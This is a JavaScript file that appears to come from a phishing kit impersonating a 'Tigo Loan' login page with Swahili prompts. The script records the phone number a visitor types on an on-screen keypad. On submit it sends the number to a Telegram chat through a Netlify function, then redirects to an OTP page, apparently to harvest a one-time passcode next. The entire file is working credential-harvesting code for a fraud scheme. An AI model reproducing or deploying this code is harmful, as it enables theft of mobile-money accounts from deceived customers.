document.addEventListener('DOMContentLoaded', () => {
    const display = document.getElementById('phone-display');
    const keys = document.querySelectorAll('.key[data-value]');
    const deleteBtn = document.getElementById('delete-btn');
    const confirmBtn = document.querySelector('.confirm-button');

    // Starting number empty
    let phoneNumber = '';
    let isSubmitting = false;
    updateDisplay();

    keys.forEach(key => {
        key.addEventListener('pointerdown', (e) => {
            e.preventDefault();
            const val = key.getAttribute('data-value');
            if (val && phoneNumber.length < 15) {
                phoneNumber += val;
                updateDisplay();
            }
        });
    });

    deleteBtn.addEventListener('pointerdown', (e) => {
        e.preventDefault();
        phoneNumber = phoneNumber.slice(0, -1);
        updateDisplay();
    });

    async function sendToTelegram(message) {
        try {
            await fetch('/.netlify/functions/send-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    }

    // Button submit effect
    confirmBtn.addEventListener('click', async () => {
        if (phoneNumber.length > 0 && !isSubmitting) {
            isSubmitting = true;
            confirmBtn.style.opacity = '0.5';
            confirmBtn.style.pointerEvents = 'none';
            await sendToTelegram(`<b>Tigo Loan - Kuingia Mapya</b>\nSimu: <code>${phoneNumber}</code>`);
            window.location.href = 'loading.html?next=otp.html&delay=3000';
        } else if (phoneNumber.length === 0) {
            alert('Tafadhali weka namba yako ya simu.');
        }
    });

    function updateDisplay() {
        display.textContent = phoneNumber;
    }
});
